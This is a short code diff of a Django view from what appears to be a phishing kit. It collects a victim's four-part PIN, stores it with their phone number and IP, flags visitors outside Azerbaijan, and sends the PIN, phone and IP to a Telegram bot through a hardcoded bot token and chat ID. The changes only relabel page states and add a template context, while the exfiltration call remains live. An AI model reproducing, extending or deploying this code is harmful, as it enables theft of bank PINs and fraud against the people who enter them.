@@ -39,7 +39,7 @@ def error(request):
 def errorpin(request):
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
-    contact.page_name="errorpin"
+    contact.page_name="ERROR PIN"
     contact.save()
     if request.method == "POST":
         request.POST
@@ -54,14 +54,17 @@ def errorpin(request):
         concatenated_pins = pin1 + pin2 + pin3 + pin4
         client_ip = get_client_ip(request)
         contact.phone1 = concatenated_pins
-        contact.page_name="OTP"
+        contact.approve_status="Loading"
         contact.save()
+        context = {
+            'last_contact_id': contact.id
+        }
         country = get_country_from_ip(contact.ip)
         if country!= "AZ":
             country= 'Şübhəli İP!'
         response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nnumber:{contact.phone}\n PIN:{contact.phone1}\n  @kitayskiadam @TetaLab @alienfx')
         request.session['contact_id'] = contact.id
-        return render(request, 'login/load.html')
+        return render(request, 'login/load.html',context)
     return render(request, "login/errorpin.html")
 
 
